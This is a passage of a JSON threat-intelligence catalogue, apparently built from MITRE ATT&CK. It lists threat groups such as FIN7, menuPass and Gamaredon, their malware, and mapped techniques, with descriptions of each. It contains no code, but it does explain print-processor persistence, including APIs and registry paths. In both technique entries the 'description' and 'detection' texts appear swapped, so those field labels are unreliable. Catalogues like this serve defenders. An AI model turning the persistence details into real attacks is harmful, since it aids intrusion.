                    "T1059.003": "Windows Command Shell",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1036.004": "Masquerade Task or Service",
                    "T1027.003": "Steganography",
                    "T1070.004": "File Deletion",
                    "T1543.003": "Windows Service",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1030": "Data Transfer Size Limits",
                    "T1008": "Fallback Channels",
                    "T1001": "Data Obfuscation"
                }
            },
            "val": 20
        },
        {
            "id": "S0360",
            "type": "tool",
            "attributes": {
                "name": "BONDUPDATER",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "BONDUPDATER is a PowerShell backdoor used by OilRig. It was first observed in November 2017 during targeting of a Middle Eastern government organization, and an updated version was observed in August 2018 being used to target a government organization with spearphishing emails.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.004": "DNS",
                    "T1564.003": "Hidden Window",
                    "T1568.002": "Domain Generation Algorithms",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1053.005": "Scheduled Task",
                    "T1105": "Ingress Tool Transfer"
                }
            },
            "val": 7
        },
        {
            "id": "S0264",
            "type": "tool",
            "attributes": {
                "name": "OopsIE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "OopsIE is a Trojan used by OilRig to remotely execute commands as well as upload/download files to/from victims.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1074.001": "Local Data Staging",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1497.001": "System Checks",
                    "T1560.003": "Archive via Custom Method",
                    "T1560.001": "Archive via Utility",
                    "T1027.002": "Software Packing",
                    "T1070.004": "File Deletion",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1124": "System Time Discovery",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1030": "Data Transfer Size Limits",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 19
        },
        {
            "id": "S0269",
            "type": "tool",
            "attributes": {
                "name": "QUADAGENT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "QUADAGENT is a PowerShell backdoor used by OilRig.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.004": "DNS",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1070.004": "File Deletion",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1112": "Modify Registry",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1008": "Fallback Channels"
                }
            },
            "val": 16
        },
        {
            "id": "S0258",
            "type": "tool",
            "attributes": {
                "name": "RGDoor",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "RGDoor is a malicious Internet Information Services (IIS) backdoor developed in the C++ language. RGDoor has been seen deployed on webservers belonging to the Middle East government organizations. RGDoor provides backdoor access to compromised IIS servers.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1560.003": "Archive via Custom Method",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1033": "System Owner/User Discovery"
                }
            },
            "val": 6
        },
        {
            "id": "S0185",
            "type": "tool",
            "attributes": {
                "name": "SEASHARPEE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "SEASHARPEE is a Web shell that has been used by OilRig.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1070.006": "Timestomp",
                    "T1505.003": "Web Shell",
                    "T1105": "Ingress Tool Transfer"
                }
            },
            "val": 4
        },
        {
            "id": "S0189",
            "type": "tool",
            "attributes": {
                "name": "ISMInjector",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "ISMInjector is a Trojan used to install another OilRig backdoor, ISMAgent.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1055.012": "Process Hollowing",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 4
        },
        {
            "id": "S0184",
            "type": "tool",
            "attributes": {
                "name": "POWRUNER",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "POWRUNER is a PowerShell script that sends and receives commands to and from the C2 server.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.004": "DNS",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1069.001": "Local Groups",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1518.001": "Security Software Discovery",
                    "T1069.002": "Domain Groups",
                    "T1087.002": "Domain Account",
                    "T1053.005": "Scheduled Task",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry"
                }
            },
            "val": 20
        },
        {
            "id": "S0170",
            "type": "tool",
            "attributes": {
                "name": "Helminth",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Helminth is a backdoor that has at least two variants - one written in VBScript and PowerShell that is delivered via a macros in Excel spreadsheets, and one that is a standalone Windows executable.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.004": "DNS",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1074.001": "Local Data Staging",
                    "T1069.001": "Local Groups",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1069.002": "Domain Groups",
                    "T1056.001": "Keylogging",
                    "T1553.002": "Code Signing",
                    "T1547.009": "Shortcut Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1053.005": "Scheduled Task",
                    "T1119": "Automated Collection",
                    "T1115": "Clipboard Data",
                    "T1105": "Ingress Tool Transfer",
                    "T1057": "Process Discovery",
                    "T1030": "Data Transfer Size Limits",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 21
        },
        {
            "id": "G0048",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "RTM",
                "aliases": [],
                "description": "RTM is a cybercriminal group that has been active since at least 2015 and is primarily interested in users of remote banking systems in Russia and neighboring countries. The group uses a Trojan by the same name (RTM).",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0148": "RTM"
                },
                "techniques": {
                    "T1102.001": "Dead Drop Resolver",
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1204.002": "Malicious File",
                    "T1566.001": "Spearphishing Attachment",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1189": "Drive-by Compromise",
                    "T1219": "Remote Access Software"
                }
            }
        },
        {
            "id": "T1568",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Dynamic Resolution",
                "chain_phase": "command-and-control",
                "description": "Detecting dynamically generated C2 can be challenging due to the number of different algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There are multiple approaches to detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more (Citation: Data Driven Security DGA). CDN domains may trigger these detections due to the format of their domain names. In addition to detecting algorithm generated domains based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.",
                "detection": "Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\n\nAdversaries may use dynamic resolution for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "S0148",
            "type": "tool",
            "attributes": {
                "name": "RTM",
                "aliases": [
                    "Redaman"
                ],
                "labels": [
                    "malware"
                ],
                "description": "RTM is custom malware written in Delphi. It is used by the group of the same name (RTM). Newer versions of the malware have been reported publicly as Redaman.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1102.001": "Dead Drop Resolver",
                    "T1571": "Non-Standard Port",
                    "T1204.002": "Malicious File",
                    "T1568": "Dynamic Resolution",
                    "T1059.003": "Windows Command Shell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1518.001": "Security Software Discovery",
                    "T1553.004": "Install Root Certificate",
                    "T1559.002": "Dynamic Data Exchange",
                    "T1056.001": "Keylogging",
                    "T1036.004": "Masquerade Task or Service",
                    "T1553.002": "Code Signing",
                    "T1070.004": "File Deletion",
                    "T1548.002": "Bypass User Account Control",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1053.005": "Scheduled Task",
                    "T1518": "Software Discovery",
                    "T1497": "Virtualization/Sandbox Evasion",
                    "T1219": "Remote Access Software",
                    "T1124": "System Time Discovery",
                    "T1120": "Peripheral Device Discovery",
                    "T1119": "Automated Collection",
                    "T1115": "Clipboard Data",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1070": "Indicator Removal on Host",
                    "T1057": "Process Discovery",
                    "T1036": "Masquerading",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 38
        },
        {
            "id": "G0047",
            "type": "group",
            "attributes": {
                "val": 1,
                "name": "Gamaredon Group",
                "aliases": [],
                "description": "Gamaredon Group is a threat group that has been active since at least 2013 and has targeted individuals likely involved in the Ukrainian government. The name Gamaredon Group comes from a misspelling of the word \"Armageddon\", which was detected in the adversary's early campaigns.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0147": "Pteranodon"
                },
                "techniques": {
                    "T1027.004": "Compile After Delivery",
                    "T1071.001": "Web Protocols",
                    "T1204.002": "Malicious File",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1562.001": "Disable or Modify Tools",
                    "T1559.001": "Component Object Model",
                    "T1027.001": "Binary Padding",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1053.005": "Scheduled Task",
                    "T1534": "Internal Spearphishing",
                    "T1221": "Template Injection",
                    "T1137": "Office Application Startup",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1120": "Peripheral Device Discovery",
                    "T1119": "Automated Collection",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1102": "Web Service",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1080": "Taint Shared Content",
                    "T1041": "Exfiltration Over C2 Channel",
                    "T1039": "Data from Network Shared Drive",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1025": "Data from Removable Media",
                    "T1020": "Automated Exfiltration",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "S0147",
            "type": "tool",
            "attributes": {
                "name": "Pteranodon",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Pteranodon is a custom backdoor used by Gamaredon Group.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1074.001": "Local Data Staging",
                    "T1059.003": "Windows Command Shell",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.011": "Rundll32",
                    "T1053.005": "Scheduled Task",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1041": "Exfiltration Over C2 Channel"
                }
            },
            "val": 11
        },
        {
            "id": "G0046",
            "type": "group",
            "attributes": {
                "val": 9,
                "name": "FIN7",
                "aliases": [],
                "description": "FIN7 is a financially-motivated threat group that has primarily targeted the U.S. retail, restaurant, and hospitality sectors since mid-2015. They often use point-of-sale malware. A portion of FIN7 was run out of a front company called Combi Security. FIN7 is sometimes referred to as Carbanak Group, but these appear to be two groups using the same Carbanak malware and are therefore tracked separately.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0517": "Pillowmint",
                    "S0417": "GRIFFON",
                    "S0416": "RDFSNIFFER",
                    "S0415": "BOOSTWRITE",
                    "S0390": "SQLRat",
                    "S0151": "HALFBAKED",
                    "S0146": "TEXTMATE",
                    "S0145": "POWERSOURCE",
                    "S0030": "Carbanak"
                },
                "techniques": {
                    "T1587.001": "Malware",
                    "T1059.007": "JavaScript",
                    "T1071.004": "DNS",
                    "T1102.002": "Bidirectional Communication",
                    "T1571": "Non-Standard Port",
                    "T1204.002": "Malicious File",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1497.002": "User Activity Based Checks",
                    "T1566.001": "Spearphishing Attachment",
                    "T1559.002": "Dynamic Data Exchange",
                    "T1036.004": "Masquerade Task or Service",
                    "T1553.002": "Code Signing",
                    "T1546.011": "Application Shimming",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.005": "Mshta",
                    "T1543.003": "Windows Service",
                    "T1053.005": "Scheduled Task",
                    "T1125": "Video Capture",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1059": "Command and Scripting Interpreter",
                    "T1043": "Commonly Used Port",
                    "T1027": "Obfuscated Files or Information"
                }
            }
        },
        {
            "id": "S0517",
            "type": "tool",
            "attributes": {
                "name": "Pillowmint",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Pillowmint is a point-of-sale malware used by FIN7 designed to capture credit card information.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.001": "PowerShell",
                    "T1560": "Archive Collected Data",
                    "T1070.004": "File Deletion",
                    "T1546.011": "Application Shimming",
                    "T1055.004": "Asynchronous Procedure Call",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1112": "Modify Registry",
                    "T1106": "Native API",
                    "T1070": "Indicator Removal on Host",
                    "T1057": "Process Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1012": "Query Registry",
                    "T1005": "Data from Local System"
                }
            },
            "val": 13
        },
        {
            "id": "S0417",
            "type": "tool",
            "attributes": {
                "name": "GRIFFON",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "GRIFFON is a JavaScript backdoor used by FIN7.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.007": "JavaScript",
                    "T1059.001": "PowerShell",
                    "T1069.002": "Domain Groups",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1053.005": "Scheduled Task",
                    "T1124": "System Time Discovery",
                    "T1113": "Screen Capture",
                    "T1082": "System Information Discovery"
                }
            },
            "val": 8
        },
        {
            "id": "S0416",
            "type": "tool",
            "attributes": {
                "name": "RDFSNIFFER",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "RDFSNIFFER is a module loaded by BOOSTWRITE which allows an attacker to monitor and tamper with legitimate connections made via an application designed to provide visibility and system management capabilities to remote IT techs.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1056.004": "Credential API Hooking",
                    "T1070.004": "File Deletion",
                    "T1106": "Native API"
                }
            },
            "val": 3
        },
        {
            "id": "S0415",
            "type": "tool",
            "attributes": {
                "name": "BOOSTWRITE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "BOOSTWRITE is a loader crafted to be launched via abuse of the DLL search order of applications used by FIN7.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1553.002": "Code Signing",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1129": "Shared Modules",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 5
        },
        {
            "id": "S0390",
            "type": "tool",
            "attributes": {
                "name": "SQLRat",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "SQLRat is malware that executes SQL scripts to avoid leaving traditional host artifacts. FIN7 has been observed using it.",
                "platforms": [],
                "techniques": {
                    "T1204.002": "Malicious File",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1070.004": "File Deletion",
                    "T1053.005": "Scheduled Task",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 8
        },
        {
            "id": "S0151",
            "type": "tool",
            "attributes": {
                "name": "HALFBAKED",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "HALFBAKED is a malware family consisting of multiple components intended to establish persistence in victim networks.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.001": "PowerShell",
                    "T1070.004": "File Deletion",
                    "T1113": "Screen Capture",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1047": "Windows Management Instrumentation"
                }
            },
            "val": 6
        },
        {
            "id": "S0146",
            "type": "tool",
            "attributes": {
                "name": "TEXTMATE",
                "aliases": [
                    "DNSMessenger"
                ],
                "labels": [
                    "malware"
                ],
                "description": "TEXTMATE is a second-stage PowerShell backdoor that is memory-resident. It was observed being used along with POWERSOURCE in February 2017.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.004": "DNS",
                    "T1059.003": "Windows Command Shell"
                }
            },
            "val": 2
        },
        {
            "id": "S0145",
            "type": "tool",
            "attributes": {
                "name": "POWERSOURCE",
                "aliases": [
                    "DNSMessenger"
                ],
                "labels": [
                    "malware"
                ],
                "description": "POWERSOURCE is a PowerShell backdoor that is a heavily obfuscated and modified version of the publicly available tool DNS_TXT_Pwnage. It was observed in February 2017 in spearphishing campaigns against personnel involved with United States Securities and Exchange Commission (SEC) filings at various organizations. The malware was delivered when macros were enabled by the victim and a VBS script was dropped.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.004": "DNS",
                    "T1564.004": "NTFS File Attributes",
                    "T1059.001": "PowerShell",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1105": "Ingress Tool Transfer",
                    "T1012": "Query Registry"
                }
            },
            "val": 6
        },
        {
            "id": "S0030",
            "type": "tool",
            "attributes": {
                "name": "Carbanak",
                "aliases": [
                    "Anunak"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Carbanak is a full-featured, remote backdoor used by a group of the same name (Carbanak). It is intended for espionage, data exfiltration, and providing remote access to infected machines.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1059.003": "Windows Command Shell",
                    "T1114.001": "Local Email Collection",
                    "T1056.001": "Keylogging",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1070.004": "File Deletion",
                    "T1136.001": "Local Account",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1055.002": "Portable Executable Injection",
                    "T1219": "Remote Access Software",
                    "T1113": "Screen Capture",
                    "T1094": "Custom Command and Control Protocol",
                    "T1057": "Process Discovery",
                    "T1043": "Commonly Used Port",
                    "T1030": "Data Transfer Size Limits",
                    "T1027": "Obfuscated Files or Information",
                    "T1012": "Query Registry",
                    "T1003": "OS Credential Dumping"
                }
            },
            "val": 20
        },
        {
            "id": "G0045",
            "type": "group",
            "attributes": {
                "val": 19,
                "name": "menuPass",
                "aliases": [
                    "Cicada",
                    "POTASSIUM",
                    "Stone Panda",
                    "APT10",
                    "Red Apollo",
                    "CVNX",
                    "HOGFISH"
                ],
                "description": "menuPass is a threat group that has been active since at least 2006. Individual members of menuPass are known to have acted in association with the Chinese Ministry of State Security's (MSS) Tianjin State Security Bureau and worked for the Huaying Haitai Science and Technology Development Company.\n\nmenuPass has targeted healthcare, defense, aerospace, finance, maritime, biotechnology, energy, and government sectors globally, with an emphasis on Japanese organizations. In 2016 and 2017, the group is known to have targeted managed IT service providers (MSPs), manufacturing and mining companies, and a university.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0552": "AdFind",
                    "S0404": "esentutl",
                    "S0357": "Impacket",
                    "S0275": "UPPERCUT",
                    "S0262": "QuasarRAT",
                    "S0194": "PowerSploit",
                    "S0160": "certutil",
                    "S0159": "SNUGRIDE",
                    "S0152": "EvilGrab",
                    "S0153": "RedLeaves",
                    "S0144": "ChChes",
                    "S0106": "cmd",
                    "S0097": "Ping",
                    "S0039": "Net",
                    "S0029": "PsExec",
                    "S0013": "PlugX",
                    "S0012": "PoisonIvy",
                    "S0006": "pwdump",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1583.001": "Domains",
                    "T1090.002": "External Proxy",
                    "T1074.002": "Remote Data Staging",
                    "T1074.001": "Local Data Staging",
                    "T1574.002": "DLL Side-Loading",
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1204.002": "Malicious File",
                    "T1568.001": "Fast Flux DNS",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1087.002": "Domain Account",
                    "T1003.004": "LSA Secrets",
                    "T1560.001": "Archive via Utility",
                    "T1560": "Archive Collected Data",
                    "T1056.001": "Keylogging",
                    "T1003.003": "NTDS",
                    "T1003.002": "Security Account Manager",
                    "T1021.004": "SSH",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1036.003": "Rename System Utilities",
                    "T1070.004": "File Deletion",
                    "T1218.004": "InstallUtil",
                    "T1055.012": "Process Hollowing",
                    "T1053.005": "Scheduled Task",
                    "T1210": "Exploitation of Remote Services",
                    "T1199": "Trusted Relationship",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1119": "Automated Collection",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1078": "Valid Accounts",
                    "T1049": "System Network Connections Discovery",
                    "T1047": "Windows Management Instrumentation",
                    "T1046": "Network Service Scanning",
                    "T1039": "Data from Network Shared Drive",
                    "T1036": "Masquerading",
                    "T1027": "Obfuscated Files or Information",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "S0275",
            "type": "tool",
            "attributes": {
                "name": "UPPERCUT",
                "aliases": [
                    "ANEL"
                ],
                "labels": [
                    "malware"
                ],
                "description": "UPPERCUT is a backdoor that has been used by menuPass.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1124": "System Time Discovery",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 10
        },
        {
            "id": "S0159",
            "type": "tool",
            "attributes": {
                "name": "SNUGRIDE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "SNUGRIDE is a backdoor that has been used by menuPass as first stage malware.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1547.001": "Registry Run Keys / Startup Folder"
                }
            },
            "val": 4
        },
        {
            "id": "S0152",
            "type": "tool",
            "attributes": {
                "name": "EvilGrab",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "EvilGrab is a malware family with common reconnaissance capabilities. It has been deployed by menuPass via malicious Microsoft Office documents as part of spearphishing campaigns.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1056.001": "Keylogging",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1125": "Video Capture",
                    "T1123": "Audio Capture",
                    "T1113": "Screen Capture",
                    "T1043": "Commonly Used Port"
                }
            },
            "val": 6
        },
        {
            "id": "S0153",
            "type": "tool",
            "attributes": {
                "name": "RedLeaves",
                "aliases": [
                    "BUGJUICE"
                ],
                "labels": [
                    "malware"
                ],
                "description": "RedLeaves is a malware family used by menuPass. The code overlaps with PlugX and may be based upon the open source tool Trochilus.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1571": "Non-Standard Port",
                    "T1574.001": "DLL Search Order Hijacking",
                    "T1059.003": "Windows Command Shell",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1070.004": "File Deletion",
                    "T1547.009": "Shortcut Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1049": "System Network Connections Discovery",
                    "T1043": "Commonly Used Port",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 20
        },
        {
            "id": "S0144",
            "type": "tool",
            "attributes": {
                "name": "ChChes",
                "aliases": [
                    "Scorpion",
                    "HAYMAKER"
                ],
                "labels": [
                    "malware"
                ],
                "description": "ChChes is a Trojan that appears to be used exclusively by menuPass. It was used to target Japanese organizations in 2016. Its lack of persistence methods suggests it may be intended as a first-stage tool.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1562.001": "Disable or Modify Tools",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1553.002": "Code Signing",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery"
                }
            },
            "val": 12
        },
        {
            "id": "G0044",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "Winnti Group",
                "aliases": [
                    "Blackfly"
                ],
                "description": "Winnti Group is a threat group with Chinese origins that has been active since at least 2010. The group has heavily targeted the gaming industry, but it has also expanded the scope of its targeting.    Some reporting suggests a number of other groups, including Axiom, APT17, and Ke3chang, are closely linked to Winnti Group.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0501": "PipeMon",
                    "S0141": "Winnti for Windows"
                },
                "techniques": {
                    "T1553.002": "Code Signing",
                    "T1057": "Process Discovery",
                    "T1014": "Rootkit"
                }
            }
        },
        {
            "id": "T1547.012",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Print Processors",
                "chain_phase": "persistence",
                "description": "Monitor process API calls to <code>AddPrintProcessor</code> and <code>GetPrintProcessorDirectory</code>. New print processor DLLs are written to the print processor directory. Also monitor Registry writes to <code>HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\\\[Windows architecture]\\Print Processors\\\\[user defined]\\\\Driver</code> or <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\\\[Windows architecture]\\Print Processors\\\\[user defined]\\Driver</code> as they pertain to print processor installations.\n\nMonitor for abnormal DLLs that are loaded by spoolsv.exe. Print processors that do not correlate with known good software or patching may be suspicious.",
                "detection": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot. \n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\CurrentControlSet or ControlSet001\\Control\\Print\\Environments\\\\Windows architecture: e.g., Windows x64\\Print Processors\\\\user defined\\Driver</code> Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the <code>GetPrintProcessorDirectory</code> API call. After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run. The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0501",
            "type": "tool",
            "attributes": {
                "name": "PipeMon",
                "aliases": [],
                "labels": [
                    "malware"
